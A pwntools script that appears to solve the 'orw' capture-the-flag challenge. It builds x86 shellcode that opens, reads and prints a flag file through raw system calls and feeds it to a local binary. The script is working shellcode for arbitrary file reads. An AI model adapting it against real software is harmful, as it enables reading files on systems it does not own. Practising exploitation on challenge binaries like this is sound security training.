from pwn import *


shell_code = asm('\n'.join([
    'push 0',
#     'push %d' % u32('txt.'),
#     'push %d' % u32('galf'),
#     'push %d' % u32('/edo'),
#     'push %d' % u32('clle'),
#     'push %d' % u32('hs_y'),
#     'push %d' % u32('bab1'),
#     'push %d' % u32('1/tf'),
#     'push %d' % u32('osce'),
#     'push %d' % u32('s/ts'),
#     'push %d' % u32('et/t'),
#     'push %d' % u32('oor/'), # Flag path
    'push 0x7478742e',
    'push 0x67616c66',
    'push 0x2f65646f',
    'push 0x636c6c65',
    'push 0x68735f79',
    'push 0x62616231',
    'push 0x312f7466',
    'push 0x6f736365',
    'push 0x732f7473',
    'push 0x65742f74',
    'push 0x6f6f722f', # Flag path
    'mov edx, 0', # Mode
    'mov ecx, 0', # Open syscall flag
    'mov ebx, esp', # Buffer
    'mov eax, 5', # Open syscall number
    'int 0x80',

    'mov edx, 10', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, eax', # fd
    'mov eax, 3', # Read syscall number
    'int 0x80',

    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 1', # fd
    'mov eax, 4', # Write syscall number
    'int 0x80',
]))


conn = process('./orw')

log.info('Pwning start')
conn.recvuntil("Give my your shellcode:")
conn.sendline(shell_code)
conn.recvall()
